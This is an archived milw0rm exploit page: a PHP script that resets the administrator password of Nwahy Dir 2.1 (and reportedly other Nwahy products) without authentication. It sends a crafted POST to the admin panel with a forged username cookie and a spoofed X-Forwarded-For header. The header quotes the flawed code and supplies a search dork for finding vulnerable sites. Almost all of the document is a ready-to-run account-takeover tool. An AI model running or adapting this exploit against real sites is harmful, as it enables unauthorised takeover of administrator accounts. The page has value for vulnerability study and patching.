<html><head><title>Nwahy Dir 2.1 Arbitrary Change Admin Password Exploit</title></head><pre>&lt;?

	/*

			[ Nwahy Dir v2.1 Change Admin Password Exploit ]         
			
		[-] Author        : rEcruit
		[-] Mail            : recru1t[@]ymail.com
		[-] Download   : http://nwahy.com/showdownload-3105.html
		
		[-] Vuln in  ./admincp/admininfo.php
		
			[code]
			
			$u = addslashes($_COOKIE['username']);
			$query = mysql_query (&quot;SELECT * FROM `dlil_admin` WHERE username='$u' AND adminoruser='0'&quot;) or die (&quot;Query failed&quot;);
			$counts = mysql_num_rows($query);
			if($counts == 0){
			echo &quot;&lt;div align='center'&gt;......................&lt;/div&gt;&quot;;
			}else{
				
			[/code]
			
		[-] Works On :
		
			1. Nwahy Articles v1
				
			2. Nwahy scripts v1

			3. Nwahy book v1
			
		[-] Note : Path to Control Panel   &quot;/admincp/&quot; .

	*/

	error_reporting(0);
	ini_set(&quot;max_execution_time&quot;,0);
	ini_set(&quot;default_socket_timeout&quot;,5);


	function Usage()
	{
			print &quot;\n\n&quot;;
			print &quot;/------------------------------------------------------------\\\n&quot;;
			print &quot;|        Nwahy Dir v2.1 Change Admin Password Exploit        |\n&quot;;
			print &quot;\------------------------------------------------------------/\n&quot;;
			print &quot;| [-] Author : rEcruit                                       |\n&quot;;
			print &quot;| [-] Mail   : recru1t@ymail.com                             |\n&quot;;
			print &quot;| [-] Greetz : RAGE SCREAM  , SAUDI L0rD , Fantastic Egypt   |\n&quot;;
			print &quot;\------------------------------------------------------------/\n&quot;;
			print &quot;| [-] Dork     : Nwahy.com 2.1 , inurl:'add-site.html'       |\n&quot;;
			print &quot;| [+] Usage    : php Exploit.php HOST PATH Options           |\n&quot;;
			print &quot;| [-] HOST     : Target server (ip/hostname)                 |\n&quot;;
			print &quot;| [-] PATH     : Path to Nwahy Dir                           |\n&quot;;
			print &quot;| [-] Options  :                                             |\n&quot;;
			print &quot;|     =&gt;Proxy  :(ex. 0.0.0.0:8080)                           |\n&quot;;
			print &quot;\------------------------------------------------------------/\n&quot;;
			print &quot;\n\n&quot;;

		exit;
	}


	function Send()
	{
		Global $host,$path,$user,$pwd,$proxy;
		
		if(empty($proxy))
		{
			$Connect	= @fsockopen($host,&quot;80&quot;) or die(&quot;[-] Bad Host .&quot;);
		}else{
			$proxy		= explode(&quot;:&quot;,$proxy);
			$Connect	= @fsockopen($proxy[0],$proxy[1]) or die(&quot;[-] Bad Proxy .&quot;);
		}
		
			$Payload	= &quot;username={$user}&amp;password={$pwd}&quot;;
			$Packet		.= &quot;POST {$path}/admincp/admininfo.php?action=edit HTTP/1.1 \r\n&quot;;
			$Packet		.= &quot;Host: {$host}\r\n&quot;;
			$Packet		.= &quot;Cookie: username={$user}\r\n&quot;;
			$Packet		.= &quot;X-Forwarded-For: 127.0.0.1\r\n&quot;;
			$Packet		.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$Packet		.= &quot;Content-Length: &quot;.(strlen($Payload)).&quot;\r\n&quot;;
			$Packet		.= &quot;Connection: close\r\n\r\n&quot;;
			$Packet		.= $Payload;

				fputs($Connect,$Packet);

				while(!feof($Connect)) 
				$Response	.= @fgets($Connect,2048);

				fclose($Connect);
		
		return $Response;
	}
	
	
	function Login()
	{
		$Response	= @Send();

			if(eregi(&quot;refresh&quot;,$Response))
			{
				$msg	= &quot;[-] Password changed .\n&quot;;
			}
			elseif(eregi(&quot;&lt;div align='center'&gt;&quot;,$Response))
			{
				$msg	= &quot;[-] Bad username .\n&quot;;
			}
			else
			{
				$msg	= &quot;[-] Exploit failed .\n&quot;;
			}

		return $msg;
	}



	if ($argc &lt; 3) Usage();

	$host	= $argv[1];
	$path	= $argv[2];;
	$proxy	= $argv[3];

	
		Print &quot;\r\n[-] Connecting to {$host} .... \r\n&quot;;
		
		while(1)
		{
			Print &quot;[-] Username: &quot;;

			if($user = str_replace (&quot; &quot;, &quot;%20&quot;, trim(fgets(STDIN))))
			{
				Print &quot;[-] New password: &quot;;

				if($pwd = str_replace (&quot; &quot;, &quot;%20&quot;, trim(fgets(STDIN))))
				{
					Print Login();
					exit;
				}


			}


		} //end while

?&gt;

# milw0rm.com [2009-07-09]</pre></html>